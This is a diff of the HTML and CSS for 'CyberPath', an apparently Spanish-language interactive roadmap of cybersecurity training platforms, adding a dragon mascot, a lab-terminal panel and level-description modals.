@@ -3,119 +3,386 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>CyberPath — Roadmap</title>
+<title>CyberPath — Dragon Edition</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='18' fill='%23050510'/><text x='50' y='68' font-size='58' text-anchor='middle' font-family='monospace' fill='%2300ff88'>%3E_</text></svg>">
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Space+Grotesk:wght@700&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 <style>
-* { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
-body { background:#050510; overflow:hidden; font-family:'JetBrains Mono',monospace; touch-action:none; }
-canvas { display:block; }
-#ui { position:fixed; inset:0; pointer-events:none; z-index:10; }
-.header { position:absolute; top:12px; left:50%; transform:translateX(-50%); text-align:center; pointer-events:none; width:100%; max-width:90vw; }
-.header h1 { font-family:'Space Grotesk',sans-serif; font-size:clamp(1.2rem,4vw,1.8rem); color:#00ff88; text-shadow:0 0 20px rgba(0,255,136,0.5); letter-spacing:2px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
-.header p { color:#505060; font-size:0.7rem; margin-top:2px; }
-#tooltip { position:absolute; background:rgba(5,5,16,0.98); border:1px solid rgba(0,255,136,0.35); border-radius:12px; padding:12px 16px; min-width:200px; max-width:280px; opacity:0; transition:opacity 0.15s; pointer-events:none; box-shadow:0 0 20px rgba(0,255,136,0.15); z-index:20; }
-#tooltip.visible { opacity:1; }
-.tt-num { font-size:0.65rem; color:#505060; margin-bottom:2px; letter-spacing:1px; }
-.tt-name { font-family:'Space Grotesk',sans-serif; font-size:0.95rem; color:#e0e0e8; margin-bottom:4px; }
-.tt-badge { display:inline-block; font-size:0.6rem; font-weight:700; padding:2px 8px; border-radius:20px; margin-bottom:6px; letter-spacing:1px; }
-.tt-url { font-size:0.68rem; color:#404055; word-break:break-all; }
-.tt-desc { font-size:0.65rem; color:#808090; margin:6px 0; line-height:1.3; }
-.tt-features { font-size:0.6rem; color:#606070; margin-top:4px; }
-.tt-features span { display:inline-block; margin:2px 4px 2px 0; padding:2px 6px; background:rgba(0,255,136,0.1); border-radius:4px; color:#00cc66; }
-.tt-click { font-size:0.65rem; margin-top:8px; color:#00ff88; display:flex; align-items:center; gap:6px; }
-.modal-overlay { position:fixed; inset:0; background:rgba(2,2,12,0.82); backdrop-filter:blur(6px); z-index:100; display:none; align-items:center; justify-content:center; padding:16px; pointer-events:all; }
-.modal-overlay.active { display:flex; }
-.modal-card { background:rgba(8,8,22,0.98); border:1px solid rgba(0,255,136,0.22); border-radius:18px; width:100%; max-width:480px; max-height:88vh; overflow-y:auto; padding:22px 22px 26px; box-shadow:0 0 60px rgba(0,255,136,0.08), 0 30px 80px rgba(0,0,0,0.7); animation:modalIn 0.22s cubic-bezier(.16,1,.3,1); scrollbar-width:thin; scrollbar-color:#1a2a1a transparent; }
-.modal-card::-webkit-scrollbar { width:4px; }
-.modal-card::-webkit-scrollbar-thumb { background:#1a3a1a; border-radius:4px; }
-@keyframes modalIn { from { opacity:0; transform:translateY(18px) scale(0.97); } to { opacity:1; transform:translateY(0) scale(1); } }
-.modal-header { display:flex; justify-content:space-between; align-items:center; padding-bottom:14px; border-bottom:1px solid rgba(0,255,136,0.15); margin-bottom:18px; }
-.modal-header h2 { font-family:'Space Grotesk',sans-serif; color:#00ff88; font-size:1.15rem; display:flex; align-items:center; gap:8px; }
-.modal-close { background:rgba(255,255,255,0.06); border:1px solid rgba(255,255,255,0.12); color:#808090; width:32px; height:32px; border-radius:8px; cursor:pointer; font-size:1.1rem; display:flex; align-items:center; justify-content:center; transition:all 0.15s; }
-.modal-close:hover { border-color:#00ff88; color:#00ff88; }
-.level-card { background:rgba(10,10,26,0.8); border:1px solid rgba(255,255,255,0.07); border-radius:12px; padding:14px; margin-bottom:14px; }
-.level-card h3 { font-family:'Space Grotesk',sans-serif; font-size:0.95rem; margin-bottom:7px; display:flex; align-items:center; gap:8px; }
-.level-card h3 .dot { width:9px; height:9px; border-radius:50%; flex-shrink:0; }
-.level-card p { font-size:0.73rem; color:#808090; line-height:1.5; margin-bottom:7px; }
-.level-card ul { font-size:0.68rem; color:#606070; padding-left:16px; }
-.level-card li { margin:3px 0; }
-.preview-header { display:flex; justify-content:space-between; align-items:flex-start; padding-bottom:12px; border-bottom:1px solid rgba(255,255,255,0.09); margin-bottom:16px; }
-.preview-title { font-family:'Space Grotesk',sans-serif; color:#e0e0e8; font-size:1.15rem; }
-.preview-badge { font-size:0.62rem; font-weight:700; padding:3px 10px; border-radius:20px; margin-top:5px; display:inline-block; }
-.preview-content { display:grid; gap:14px; }
-.preview-section h4 { font-family:'Space Grotesk',sans-serif; color:#00ff88; font-size:0.82rem; margin-bottom:7px; display:flex; align-items:center; gap:6px; }
-.preview-section p, .preview-section li { font-size:0.73rem; color:#808090; line-height:1.5; }
-.preview-section ul { padding-left:16px; }
-.preview-section li { margin:3px 0; }
-.preview-meta { display:grid; grid-template-columns:repeat(2,1fr); gap:8px; margin-top:6px; }
-.preview-meta-item { background:rgba(0,255,136,0.07); border-radius:8px; padding:9px 10px; font-size:0.68rem; }
-.preview-meta-label { color:#505060; font-size:0.62rem; display:block; margin-bottom:3px; }
-.preview-meta-value { color:#00ff88; font-weight:700; }
-.preview-cta { margin-top:18px; display:flex; gap:8px; }
-.preview-cta a { flex:1; text-align:center; padding:11px; background:#00ff88; color:#050510; text-decoration:none; border-radius:10px; font-weight:700; font-size:0.82rem; transition:transform 0.15s, box-shadow 0.15s; display:flex; align-items:center; justify-content:center; gap:6px; }
-.preview-cta a:hover { transform:scale(1.03); box-shadow:0 4px 20px rgba(0,255,136,0.3); }
-.preview-cta a.secondary { background:rgba(255,255,255,0.08); color:#c0c0d0; border:1px solid rgba(255,255,255,0.1); }
-.preview-cta a.secondary:hover { background:rgba(255,255,255,0.13); box-shadow:none; }
-.legend { position:absolute; bottom:16px; left:50%; transform:translateX(-50%); display:flex; gap:14px; background:rgba(5,5,16,0.85); border:1px solid rgba(0,255,136,0.12); border-radius:24px; padding:8px 16px; pointer-events:none; }
-.leg-item { display:flex; align-items:center; gap:6px; font-size:0.7rem; color:#707080; }
-.leg-dot { width:8px; height:8px; border-radius:50%; }
-.hint { position:absolute; bottom:64px; left:50%; transform:translateX(-50%); color:#303040; font-size:0.68rem; white-space:nowrap; text-align:center; padding:0 10px; }
-.controls { position:absolute; top:12px; right:12px; display:flex; flex-direction:column; gap:6px; pointer-events:all; }
-.ctrl-btn { background:rgba(5,5,16,0.85); border:1px solid rgba(0,255,136,0.18); color:#808090; width:36px; height:36px; border-radius:8px; font-size:1rem; cursor:pointer; display:flex; align-items:center; justify-content:center; transition:all 0.15s; font-family:inherit; }
-.ctrl-btn:hover { border-color:#00ff88; color:#00ff88; }
-.level-panel { position:absolute; top:12px; left:12px; display:flex; flex-direction:column; gap:6px; pointer-events:none; }
-.lp-row { display:flex; align-items:center; gap:8px; background:rgba(5,5,16,0.75); border:1px solid rgba(255,255,255,0.06); border-radius:8px; padding:6px 12px; }
-.lp-num { font-size:1rem; font-weight:700; }
-.lp-label { font-size:0.68rem; color:#606070; }
-#btnInfo { position:absolute; top:12px; left:12px; width:36px; height:36px; border-radius:8px; background:rgba(5,5,16,0.85); border:1px solid rgba(0,255,136,0.3); color:#00ff88; font-weight:700; font-size:1rem; cursor:pointer; pointer-events:all; display:none; align-items:center; justify-content:center; transition:all 0.15s; }
-#btnInfo:hover { background:rgba(0,255,136,0.12); }
-@media(max-width:768px){ .header { top:8px; } .header h1 { font-size:1.3rem; } .level-panel { display:none; } #btnInfo { display:flex; } .hint { bottom:56px; font-size:0.65rem; } .legend { bottom:12px; padding:6px 12px; gap:10px; } .leg-item { font-size:0.65rem; } .controls { top:8px; right:8px; } .ctrl-btn { width:34px; height:34px; } .modal-card { padding:16px 16px 20px; } .preview-meta { grid-template-columns:1fr; } }
-@media(max-width:480px){ .header h1 { font-size:1.15rem; } .controls { gap:4px; } .ctrl-btn { width:32px; height:32px; } #btnInfo { width:32px; height:32px; } .legend { gap:8px; padding:5px 10px; } .leg-item { font-size:0.6rem; gap:4px; } .leg-dot { width:7px; height:7px; } .hint { display:none; } }
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{background:#050510;overflow:hidden;font-family:'JetBrains Mono',monospace;touch-action:none}
+canvas{display:block}
+#ui{position:fixed;inset:0;pointer-events:none;z-index:10}
+.header{position:absolute;top:12px;left:50%;transform:translateX(-50%);text-align:center;pointer-events:none;width:100%;max-width:90vw}
+.header h1{font-family:'Space Grotesk',sans-serif;font-size:clamp(1.2rem,4vw,1.8rem);color:#00ff88;text-shadow:0 0 20px rgba(0,255,136,0.5);letter-spacing:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.header p{color:#505060;font-size:0.7rem;margin-top:2px}
+#tooltip{position:absolute;background:rgba(5,5,16,0.98);border:1px solid rgba(0,255,136,0.35);border-radius:12px;padding:12px 16px;min-width:200px;max-width:280px;opacity:0;transition:opacity 0.15s;pointer-events:none;box-shadow:0 0 20px rgba(0,255,136,0.15);z-index:20}
+#tooltip.visible{opacity:1}
+.tt-num{font-size:0.65rem;color:#505060;margin-bottom:2px;letter-spacing:1px}
+.tt-name{font-family:'Space Grotesk',sans-serif;font-size:0.95rem;color:#e0e0e8;margin-bottom:4px}
+.tt-badge{display:inline-block;font-size:0.6rem;font-weight:700;padding:2px 8px;border-radius:20px;margin-bottom:6px;letter-spacing:1px}
+.tt-url{font-size:0.68rem;color:#404055;word-break:break-all}
+.tt-desc{font-size:0.65rem;color:#808090;margin:6px 0;line-height:1.3}
+.tt-features{font-size:0.6rem;color:#606070;margin-top:4px}
+.tt-features span{display:inline-block;margin:2px 4px 2px 0;padding:2px 6px;background:rgba(0,255,136,0.1);border-radius:4px;color:#00cc66}
+.tt-click{font-size:0.65rem;margin-top:8px;color:#00ff88;display:flex;align-items:center;gap:6px}
+#speechBubble{position:fixed;background:rgba(4,4,14,0.97);border:1px solid rgba(0,255,136,0.5);border-radius:14px;padding:14px 18px;max-width:260px;pointer-events:none;opacity:0;transition:opacity 0.35s;z-index:50;box-shadow:0 0 30px rgba(0,255,136,0.25),0 0 60px rgba(0,255,136,0.08)}
+#speechBubble.visible{opacity:1}
+#speechBubble::after{content:'';position:absolute;bottom:-9px;left:24px;width:16px;height:16px;background:rgba(4,4,14,0.97);border-right:1px solid rgba(0,255,136,0.5);border-bottom:1px solid rgba(0,255,136,0.5);transform:rotate(45deg)}
+.sb-dragon{font-size:0.6rem;color:#606070;letter-spacing:2px;margin-bottom:4px;display:flex;align-items:center;gap:6px}
+.sb-dragon-dot{width:6px;height:6px;border-radius:50%;background:#00ff88;animation:sbPulse 1s infinite}
+@keyframes sbPulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.4;transform:scale(0.7)}}
+.sb-name{font-family:'Space Grotesk',sans-serif;color:#e0e0e8;font-size:1rem;margin-bottom:5px}
+.sb-badge{display:inline-block;font-size:0.58rem;font-weight:700;padding:2px 8px;border-radius:20px;margin-bottom:8px;letter-spacing:1px}
+.sb-cmd{font-size:0.62rem;color:#00ff88;font-family:'JetBrains Mono',monospace;margin-bottom:6px;padding:4px 8px;background:rgba(0,255,136,0.07);border-radius:6px;border-left:2px solid #00ff88}
+.sb-desc{font-size:0.65rem;color:#707080;line-height:1.45}
+#dragonInfo{position:absolute;bottom:70px;right:12px;background:rgba(5,5,16,0.85);border:1px solid rgba(0,255,136,0.2);border-radius:10px;padding:8px 12px;pointer-events:none;font-size:0.65rem;color:#505060;text-align:right;min-width:120px}
+#dragonInfo .di-name{color:#00ff88;font-family:'Space Grotesk',sans-serif;font-size:0.75rem;margin-bottom:2px}
+#dragonInfo .di-status{color:#404050;font-size:0.6rem}
+.modal-overlay{position:fixed;inset:0;background:rgba(2,2,12,0.82);backdrop-filter:blur(6px);z-index:100;display:none;align-items:center;justify-content:center;padding:16px;pointer-events:all}
+.modal-overlay.active{display:flex}
+.modal-card{background:rgba(8,8,22,0.98);border:1px solid rgba(0,255,136,0.22);border-radius:18px;width:100%;max-width:480px;max-height:88vh;overflow-y:auto;padding:22px 22px 26px;box-shadow:0 0 60px rgba(0,255,136,0.08),0 30px 80px rgba(0,0,0,0.7);animation:modalIn 0.22s cubic-bezier(.16,1,.3,1);scrollbar-width:thin;scrollbar-color:#1a2a1a transparent}
+.modal-card::-webkit-scrollbar{width:4px}
+.modal-card::-webkit-scrollbar-thumb{background:#1a3a1a;border-radius:4px}
+@keyframes modalIn{from{opacity:0;transform:translateY(18px) scale(0.97)}to{opacity:1;transform:translateY(0) scale(1)}}
+.modal-header{display:flex;justify-content:space-between;align-items:center;padding-bottom:14px;border-bottom:1px solid rgba(0,255,136,0.15);margin-bottom:18px}
+.modal-header h2{font-family:'Space Grotesk',sans-serif;color:#00ff88;font-size:1.15rem;display:flex;align-items:center;gap:8px}
+.modal-close{background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.12);color:#808090;width:32px;height:32px;border-radius:8px;cursor:pointer;font-size:1.1rem;display:flex;align-items:center;justify-content:center;transition:all 0.15s}
+.modal-close:hover{border-color:#00ff88;color:#00ff88}
+.level-card{background:rgba(10,10,26,0.8);border:1px solid rgba(255,255,255,0.07);border-radius:12px;padding:14px;margin-bottom:14px}
+.level-card h3{font-family:'Space Grotesk',sans-serif;font-size:0.95rem;margin-bottom:7px;display:flex;align-items:center;gap:8px}
+.level-card h3 .dot{width:9px;height:9px;border-radius:50%;flex-shrink:0}
+.level-card p{font-size:0.73rem;color:#808090;line-height:1.5;margin-bottom:7px}
+.level-card ul{font-size:0.68rem;color:#606070;padding-left:16px}
+.level-card li{margin:3px 0}
+.preview-header{display:flex;justify-content:space-between;align-items:flex-start;padding-bottom:12px;border-bottom:1px solid rgba(255,255,255,0.09);margin-bottom:16px}
+.preview-title{font-family:'Space Grotesk',sans-serif;color:#e0e0e8;font-size:1.15rem}
+.preview-badge{font-size:0.62rem;font-weight:700;padding:3px 10px;border-radius:20px;margin-top:5px;display:inline-block}
+.preview-content{display:grid;gap:14px}
+.preview-section h4{font-family:'Space Grotesk',sans-serif;color:#00ff88;font-size:0.82rem;margin-bottom:7px;display:flex;align-items:center;gap:6px}
+.preview-section p,.preview-section li{font-size:0.73rem;color:#808090;line-height:1.5}
+.preview-section ul{padding-left:16px}
+.preview-section li{margin:3px 0}
+.preview-meta{display:grid;grid-template-columns:repeat(2,1fr);gap:8px;margin-top:6px}
+.preview-meta-item{background:rgba(0,255,136,0.07);border-radius:8px;padding:9px 10px;font-size:0.68rem}
+.preview-meta-label{color:#505060;font-size:0.62rem;display:block;margin-bottom:3px}
+.preview-meta-value{color:#00ff88;font-weight:700}
+.preview-cta{margin-top:18px;display:flex;gap:8px}
+.preview-cta a{flex:1;text-align:center;padding:11px;background:#00ff88;color:#050510;text-decoration:none;border-radius:10px;font-weight:700;font-size:0.82rem;transition:transform 0.15s,box-shadow 0.15s;display:flex;align-items:center;justify-content:center;gap:6px}
+.preview-cta a:hover{transform:scale(1.03);box-shadow:0 4px 20px rgba(0,255,136,0.3)}
+.preview-cta a.secondary{background:rgba(255,255,255,0.08);color:#c0c0d0;border:1px solid rgba(255,255,255,0.1)}
+.preview-cta a.secondary:hover{background:rgba(255,255,255,0.13);box-shadow:none}
+.legend{position:absolute;bottom:16px;left:50%;transform:translateX(-50%);display:flex;gap:14px;background:rgba(5,5,16,0.85);border:1px solid rgba(0,255,136,0.12);border-radius:24px;padding:8px 16px;pointer-events:none}
+.leg-item{display:flex;align-items:center;gap:6px;font-size:0.7rem;color:#707080}
+.leg-dot{width:8px;height:8px;border-radius:50%}
+.hint{position:absolute;bottom:64px;left:50%;transform:translateX(-50%);color:#303040;font-size:0.68rem;white-space:nowrap;text-align:center;padding:0 10px}
+.controls{position:absolute;top:12px;right:12px;display:flex;flex-direction:column;gap:6px;pointer-events:all}
+.ctrl-btn{background:rgba(5,5,16,0.85);border:1px solid rgba(0,255,136,0.18);color:#808090;width:36px;height:36px;border-radius:8px;font-size:1rem;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all 0.15s;font-family:inherit}
+.ctrl-btn:hover{border-color:#00ff88;color:#00ff88}
+.ctrl-btn.active{border-color:#00ff88;color:#00ff88;background:rgba(0,255,136,0.08)}
+.level-panel{position:absolute;top:12px;left:12px;display:flex;flex-direction:column;gap:6px;pointer-events:none}
+.lp-row{display:flex;align-items:center;gap:8px;background:rgba(5,5,16,0.75);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:6px 12px}
+.lp-num{font-size:1rem;font-weight:700}
+.lp-label{font-size:0.68rem;color:#606070}
+#btnInfo{position:absolute;top:12px;left:12px;width:36px;height:36px;border-radius:8px;background:rgba(5,5,16,0.85);border:1px solid rgba(0,255,136,0.3);color:#00ff88;font-weight:700;font-size:1rem;cursor:pointer;pointer-events:all;display:none;align-items:center;justify-content:center;transition:all 0.15s}
+#btnInfo:hover{background:rgba(0,255,136,0.12)}
+@media(max-width:768px){.header{top:8px}.header h1{font-size:1.3rem}.level-panel{display:none}#btnInfo{display:flex}.hint{bottom:56px;font-size:0.65rem}.legend{bottom:12px;padding:6px 12px;gap:10px}.leg-item{font-size:0.65rem}.controls{top:8px;right:8px}.ctrl-btn{width:34px;height:34px}.modal-card{padding:16px 16px 20px}.preview-meta{grid-template-columns:1fr}#dragonInfo{display:none}
+  /* Lab modal mobile */
+  #labOverlay .modal-card{height:95vh;max-height:95vh;border-radius:14px}
+  #labSidebarWrapper{width:100%!important;border-right:none!important;border-bottom:1px solid rgba(255,255,255,0.07);flex-shrink:0;overflow-x:auto;overflow-y:hidden!important;display:flex!important;flex-direction:row!important;padding:6px 8px!important;gap:6px;max-height:52px}
+  #labSidebar{display:flex!important;flex-direction:row!important;gap:6px;padding:0!important;width:max-content}
+  .lab-item{padding:6px 12px!important;border-left:none!important;border-bottom:3px solid transparent;border-radius:8px;white-space:nowrap;flex-shrink:0}
+  #labInputBar{flex-wrap:wrap;gap:6px!important;padding:8px 10px!important}
+  #labInputBar #labPrompt{display:none}
+  #labInputBar #labInput{min-width:0;font-size:0.75rem!important}
+  #labInputBar #labRun{padding:6px 14px!important;font-size:0.7rem!important}
+  #labInputBar #labHint,#labInputBar #labReset{padding:6px 10px!important}
+  #labDescArea{padding:10px 12px!important}
+  #labTerminal{font-size:0.7rem!important;padding:10px 12px!important}
+}
+@media(max-width:480px){.header h1{font-size:1.15rem}.controls{gap:4px}.ctrl-btn{width:32px;height:32px}#btnInfo{width:32px;height:32px}.legend{gap:8px;padding:5px 10px}.leg-item{font-size:0.6rem;gap:4px}.leg-dot{width:7px;height:7px}.hint{display:none}
+  #labOverlay .modal-card{height:100vh;max-height:100vh;border-radius:0}
+  #labSidebarWrapper{max-height:46px}
+  #labTerminal{font-size:0.67rem!important}
+}
+/* ── Theory / Clase Magistral ── */
+#theoryPanel{display:none;position:absolute;inset:0;background:rgba(4,4,14,0.98);z-index:10;overflow-y:auto;padding:20px 22px 24px;flex-direction:column;gap:14px}
+#theoryPanel.visible{display:flex}
+.theory-badge{display:inline-block;font-size:0.58rem;font-weight:700;padding:2px 9px;border-radius:20px;letter-spacing:1px;margin-bottom:8px}
+.theory-title{font-family:'Space Grotesk',sans-serif;color:#e0e0e8;font-size:1.1rem;margin-bottom:4px}
+.theory-subtitle{font-size:0.68rem;color:#505065;letter-spacing:2px;margin-bottom:14px}
+.theory-block{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:10px;padding:12px 14px}
+.theory-block h4{font-family:'Space Grotesk',sans-serif;font-size:0.8rem;margin-bottom:6px;display:flex;align-items:center;gap:7px}
+.theory-block p,.theory-block li{font-size:0.72rem;color:#9090a8;line-height:1.55}
+.theory-block ul{padding-left:16px;margin-top:4px}
+.theory-block li{margin:3px 0}
+.theory-cmd{font-family:'JetBrains Mono',monospace;font-size:0.66rem;background:rgba(0,255,136,0.07);border-left:2px solid #00ff88;padding:3px 8px;border-radius:0 5px 5px 0;color:#00cc66;margin:3px 0;display:block}
+.theory-start-btn{margin-top:6px;padding:12px 20px;background:#00ff88;color:#050510;border:none;border-radius:10px;font-family:'Space Grotesk',sans-serif;font-weight:700;font-size:0.9rem;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:transform 0.15s,box-shadow 0.15s;flex-shrink:0}
+.theory-start-btn:hover{transform:scale(1.02);box-shadow:0 4px 22px rgba(0,255,136,0.3)}
+.theory-tab-btn{font-size:0.62rem;font-family:'JetBrains Mono',monospace;background:rgba(0,255,136,0.08);border:1px solid rgba(0,255,136,0.25);color:#00cc66;padding:3px 10px;border-radius:6px;cursor:pointer;transition:all 0.15s;flex-shrink:0}
+.theory-tab-btn:hover{background:rgba(0,255,136,0.15)}
 </style>
 </head>
 <body>
 
 <div id="ui">
-  <div class="header"><h1>&gt;_ cyberpath</h1><p>Roadmap interactivo · 18 laboratorios de ciberseguridad</p></div>
+  <div class="header"><h1>&gt;_ cyberpath &nbsp;<span style="color:#ff3333;font-size:0.75em;vertical-align:middle">🐉</span></h1><p>Roadmap interactivo · 18 laboratorios</p></div>
   <div id="tooltip"><div class="tt-num" id="ttNum">PLATAFORMA #01</div><div class="tt-name" id="ttName">—</div><div class="tt-badge" id="ttBadge">—</div><div class="tt-url" id="ttUrl">—</div><div class="tt-desc" id="ttDesc">—</div><div class="tt-features" id="ttFeatures"></div><div class="tt-click"><i class="fa-solid fa-arrow-up-right-from-square" style="font-size:14px"></i> Abrir plataforma</div></div>
+  <div id="speechBubble">
+    <div class="sb-dragon"><div class="sb-dragon-dot"></div>KALI</div>
+    <div class="sb-name" id="sbName">—</div>
+    <span class="sb-badge" id="sbBadge">—</span>
+    <div class="sb-cmd" id="sbCmd">&gt; _</div>
+    <div class="sb-desc" id="sbDesc">—</div>
+  </div>
+  <div id="dragonInfo">
+    <div class="di-name">🐉 Kali</div>
+    <div class="di-status" id="diStatus">Despegando...</div>
+  </div>
   <button id="btnInfo" title="¿Por qué estos niveles?"><i class="fa-solid fa-circle-question" style="font-size:18px"></i></button>
   <div class="level-panel"><div class="lp-row"><span class="lp-num" style="color:#00ff88">6</span><span class="lp-label">Principiante</span></div><div class="lp-row"><span class="lp-num" style="color:#ff9500">6</span><span class="lp-label">Intermedio</span></div><div class="lp-row"><span class="lp-num" style="color:#ff5555">6</span><span class="lp-label">Avanzado</span></div></div>
   <div class="legend"><div class="leg-item"><div class="leg-dot" style="background:#00ff88"></div>Principiante</div><div class="leg-item"><div class="leg-dot" style="background:#ff9500"></div>Intermedio</div><div class="leg-item"><div class="leg-dot" style="background:#ff5555"></div>Avanzado</div></div>
-  <div class="hint">Arrastra para rotar · Tocá para visitar · Ver niveles</div>
-  <div class="controls"><button class="ctrl-btn" id="btnReset" title="Reset"><i class="fa-solid fa-house" style="font-size:18px"></i></button><button class="ctrl-btn" id="btnAuto" title="Auto-rotar"><i class="fa-solid fa-play" style="font-size:16px" id="autoIcon"></i></button></div>
+  <div class="hint">Arrastra para rotar · Click para visitar · El dragón revela cada plataforma</div>
+  <div class="controls">
+    <button class="ctrl-btn" id="btnReset" title="Reset"><i class="fa-solid fa-house" style="font-size:18px"></i></button>
+    <button class="ctrl-btn" id="btnAuto" title="Auto-rotar"><i class="fa-solid fa-play" style="font-size:16px" id="autoIcon"></i></button>
+    <button class="ctrl-btn" id="btnDragon" title="Toggle dragón" style="color:#00ff88;border-color:rgba(0,255,136,0.4)"><i class="fa-solid fa-dragon" style="font-size:16px"></i></button>
+    <button class="ctrl-btn" id="btnLab" title="Laboratorio de retos" style="color:#a78bfa;border-color:rgba(167,139,250,0.4)"><i class="fa-solid fa-terminal" style="font-size:15px"></i></button>
+  </div>
 </div>
 
-<div class="modal-overlay" id="levelOverlay"><div class="modal-card"><div class="modal-header"><h2><i class="fa-solid fa-chart-simple" style="color:#00ff88;font-size:22px"></i> Criterios de Nivel</h2><button class="modal-close" id="closeLevelModal"><i class="fa-solid fa-xmark" style="font-size:16px"></i></button></div><div class="level-card" style="border-left:3px solid #00ff88"><h3><span class="dot" style="background:#00ff88"></span><span style="color:#00ff88">Principiante</span></h3><p><strong style="color:#c0c0d0">¿Para quién?</strong> Personas sin experiencia previa en ciberseguridad.</p><p><strong style="color:#c0c0d0">¿Qué encontrarás?</strong> Tutoriales guiados, conceptos básicos, retos con pistas y soluciones paso a paso.</p><ul><li>Sin necesidad de conocimientos técnicos previos</li><li>Entornos controlados y seguros</li><li>Feedback inmediato y educativo</li><li>Fundamentos: Linux, redes, web básica</li></ul></div><div class="level-card" style="border-left:3px solid #ff9500"><h3><span class="dot" style="background:#ff9500"></span><span style="color:#ff9500">Intermedio</span></h3><p><strong style="color:#c0c0d0">¿Para quién?</strong> Quienes ya dominan lo básico y buscan escenarios más realistas.</p><p><strong style="color:#c0c0d0">¿Qué encontrarás?</strong> Máquinas vulnerables, CTFs, laboratorios de explotación web.</p><ul><li>Requiere terminal, HTTP y scripting básico</li><li>Menos pistas, más investigación autónoma</li><li>Herramientas profesionales (Burp, Nmap, Metasploit)</li><li>Metodologías de pentesting</li></ul></div><div class="level-card" style="border-left:3px solid #ff5555"><h3><span class="dot" style="background:#ff5555"></span><span style="color:#ff5555">Avanzado</span></h3><p><strong style="color:#c0c0d0">¿Para quién?</strong> Profesionales que buscan simular entornos de producción reales.</p><p><strong style="color:#c0c0d0">¿Qué encontrarás?</strong> Infraestructuras complejas, exploits, ingeniería inversa, escenarios enterprise.</p><ul><li>Requiere dominio de redes, sistemas y programación</li><li>Investigación profunda necesaria</li><li>Debugging, fuzzing, análisis de binarios</li><li>Preparación para OSCP, OSCE, etc.</li></ul></div><p style="text-align:center; color:#404055; font-size:0.68rem; margin-top:4px; display:flex; align-items:center; justify-content:center; gap:6px;"><i class="fa-regular fa-lightbulb" style="color:#505060;font-size:14px"></i> Sigue el orden sugerido para construir una base sólida.</p></div></div>
+<div class="modal-overlay" id="levelOverlay"><div class="modal-card"><div class="modal-header"><h2><i class="fa-solid fa-chart-simple" style="color:#00ff88;font-size:22px"></i> Criterios de Nivel</h2><button class="modal-close" id="closeLevelModal"><i class="fa-solid fa-xmark" style="font-size:16px"></i></button></div><div class="level-card" style="border-left:3px solid #00ff88"><h3><span class="dot" style="background:#00ff88"></span><span style="color:#00ff88">Principiante</span></h3><p><strong style="color:#c0c0d0">¿Para quién?</strong> Personas sin experiencia previa en ciberseguridad.</p><p><strong style="color:#c0c0d0">¿Qué encontrarás?</strong> Tutoriales guiados, conceptos básicos, retos con pistas.</p><ul><li>Sin necesidad de conocimientos técnicos previos</li><li>Entornos controlados y seguros</li><li>Fundamentos: Linux, redes, web básica</li></ul></div><div class="level-card" style="border-left:3px solid #ff9500"><h3><span class="dot" style="background:#ff9500"></span><span style="color:#ff9500">Intermedio</span></h3><p><strong style="color:#c0c0d0">¿Para quién?</strong> Quienes dominan lo básico y buscan escenarios más realistas.</p><p><strong style="color:#c0c0d0">¿Qué encontrarás?</strong> Máquinas vulnerables, CTFs, laboratorios de explotación web.</p><ul><li>Requiere terminal, HTTP y scripting básico</li><li>Herramientas profesionales (Burp, Nmap, Metasploit)</li></ul></div><div class="level-card" style="border-left:3px solid #ff5555"><h3><span class="dot" style="background:#ff5555"></span><span style="color:#ff5555">Avanzado</span></h3><p><strong style="color:#c0c0d0">¿Para quién?</strong> Profesionales que buscan simular entornos de producción reales.</p><p><strong style="color:#c0c0d0">¿Qué encontrarás?</strong> Infraestructuras complejas, exploits, ingeniería inversa.</p><ul><li>Requiere dominio de redes, sistemas y programación</li><li>Preparación para OSCP, OSCE, etc.</li></ul></div></div></div>
 
-<div class="modal-overlay" id="previewOverlay"><div class="modal-card"><div class="preview-header"><div><div class="preview-title" id="pvName">—</div><span class="preview-badge" id="pvBadge">—</span></div><button class="modal-close" id="closePreview"><i class="fa-solid fa-xmark" style="font-size:16px"></i></button></div><div class="preview-content"><div class="preview-section"><h4><i class="fa-regular fa-clipboard" style="font-size:16px"></i> Descripción</h4><p id="pvDesc">—</p></div><div class="preview-section"><h4><i class="fa-solid fa-bullseye" style="font-size:16px"></i> ¿Por qué este nivel?</h4><p id="pvReason">—</p></div><div class="preview-section"><h4><i class="fa-solid fa-wand-magic-sparkles" style="font-size:16px"></i> Características</h4><ul id="pvFeatures"></ul></div><div class="preview-section"><h4><i class="fa-solid fa-chart-pie" style="font-size:16px"></i> Información Técnica</h4><div class="preview-meta"><div class="preview-meta-item"><span class="preview-meta-label">Dominio</span><span class="preview-meta-value" id="pvDomain">—</span></div><div class="preview-meta-item"><span class="preview-meta-label">Tipo</span><span class="preview-meta-value" id="pvType">—</span></div><div class="preview-meta-item"><span class="preview-meta-label">Idioma</span><span class="preview-meta-value" id="pvLang">—</span></div><div class="preview-meta-item"><span class="preview-meta-label">Precio</span><span class="preview-meta-value" id="pvPrice">—</span></div></div></div><div class="preview-cta"><a href="#" target="_blank" id="pvVisit"><i class="fa-solid fa-rocket" style="font-size:16px"></i> Visitar Plataforma</a><a href="#" target="_blank" id="pvSEO" class="secondary"><i class="fa-solid fa-magnifying-glass" style="font-size:16px"></i> Ver Info</a></div></div></div></div>
